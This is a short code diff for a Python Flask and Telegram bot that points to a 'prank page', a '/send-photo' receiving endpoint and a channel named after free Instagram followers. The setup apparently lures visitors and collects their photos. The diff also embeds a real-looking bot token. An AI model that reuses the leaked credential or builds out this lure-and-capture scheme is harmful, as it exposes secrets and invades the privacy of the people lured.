@@ -1,13 +1,13 @@
-
 from flask import Flask, request
 from threading import Thread
 from telegram import Bot, Update, InlineKeyboardMarkup, InlineKeyboardButton
 from telegram.ext import CommandHandler, CallbackQueryHandler, CallbackContext, Updater
 import os
 
+
 BOT_TOKEN = '6515038883:AAF3LfbnrUcQBBWiSYs4qpjQCRNQWUAdG1o'  # Replace this
 CHANNEL_USERNAME = '@freeinstagramfollowers_10'  # Replace this
-NETLIFY_BASE_URL = 'https://hiwhoisthis.netlify.app/'  # Replace with your hosted prank page
+FRONTEND_URL = 'https://hiwhoisthis.netlify.app/'  # Replace with your hosted prank page
 RECEIVE_ENDPOINT = '/send-photo'  # API endpoint for receiving photos
 
 # === Flask Setup ===
